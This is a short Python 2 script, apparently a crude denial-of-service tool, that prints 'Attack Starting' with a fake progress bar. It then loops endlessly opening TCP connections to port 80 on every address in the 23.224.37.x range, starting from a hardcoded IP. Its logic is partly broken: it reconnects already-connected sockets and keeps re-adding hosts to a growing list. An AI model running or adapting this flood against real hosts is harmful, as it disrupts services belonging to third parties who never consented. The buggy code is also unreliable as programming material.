import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year



print

print
ip ="23.224.37.202"
port =80
host_list=[]
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     for ipnum in range(1,255):
          host_list.append('23.224.37.'+str(ipnum))
          for host_ip in host_list:
               print host_ip
               try:
                    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    sock.connect((host_ip,80))
                    for i in range(1,255):
                        sock.connect((host_ip,80))                    
                    print sock
               except Exception as e:
                    pass
               continue
